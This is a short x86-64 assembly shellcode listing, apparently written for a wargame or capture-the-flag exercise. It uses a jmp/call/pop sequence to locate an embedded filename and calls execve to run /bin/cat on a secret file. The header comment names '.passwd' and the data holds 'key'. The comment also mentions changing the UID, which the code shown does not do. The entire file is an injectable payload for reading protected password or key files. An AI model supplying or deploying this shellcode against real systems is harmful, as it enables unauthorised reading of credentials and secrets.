	;; execv("/bin/cat", ["/bin/cat", ".passwd"], [])
	;; You can change the filename and the UID

	section .text
	global _start

_start:
	jmp FILENAME
RET:
	pop rax

	xor rdx,rdx
	push rdx
	mov rcx, '/bin/cat'
	push rcx
	mov rdi, rsp

	push rdx
	push rax
	push rdi

	xor rax, rax
	mov rsi, rsp
	mov al, 59
	syscall

FILENAME:
	call RET
filename:	db 'key', 0x00
